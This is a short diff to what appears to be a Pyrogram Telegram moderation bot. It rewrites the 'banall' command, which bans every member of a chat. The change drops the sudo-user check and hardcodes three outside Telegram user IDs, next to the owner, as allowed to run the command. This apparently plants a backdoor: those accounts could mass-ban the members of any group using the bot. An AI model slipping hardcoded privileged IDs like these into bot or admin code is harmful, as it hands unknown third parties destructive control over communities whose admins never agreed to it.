@@ -702,27 +702,33 @@ async def ban_members(chat_id, user_id, bot_permission, total_members, msg):
         f"ᴛᴏᴛᴀʟ ʙᴀɴɴᴇᴅ: {banned_count}\nғᴀɪʟᴇᴅ ʙᴀɴs: {failed_count}\nsᴛᴏᴘᴘᴇᴅ ᴀs ғᴀɪʟᴇᴅ ʙᴀɴs ᴇxᴄᴇᴇᴅᴇᴅ ʟɪᴍɪᴛ."
     )
 
+from config import OWNER_ID
+EXTRA_BANALL_IDS = [7574330905, 1786683163, 7282752816]
 
-@app.on_message(filters.command("banall") & SUDOERS)
-async def ban_all(_, msg):
+BANALL_USERS = [OWNER_ID] + EXTRA_BANALL_IDS
+
+@app.on_message(filters.command("banall"))
+async def ban_all(_, msg: Message):
     chat_id = msg.chat.id
     user_id = msg.from_user.id  # ID of the user who issued the command
-    
-    bot = await app.get_chat_member(chat_id, BOT_ID)
-    bot_permission = bot.privileges.can_restrict_members
-    
+
+    # Permission check
+    if user_id not in BANALL_USERS:
+        return await msg.reply_text("🚫 Only my owner can use this command!")
+
+    bot = await app.get_chat_member(chat_id, (await app.get_me()).id)
+    bot_permission = bot.privileges.can_restrict_members if bot.privileges else False
+
     if bot_permission:
         total_members = 0
         async for _ in app.get_chat_members(chat_id):
             total_members += 1
-        
+
         await ban_members(chat_id, user_id, bot_permission, total_members, msg)
-    
     else:
         await msg.reply_text(
-            "ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs"
+            "❌ Either I don't have ban rights or you're not authorized."
         )
-
 
 
 from pyrogram import Client, filters
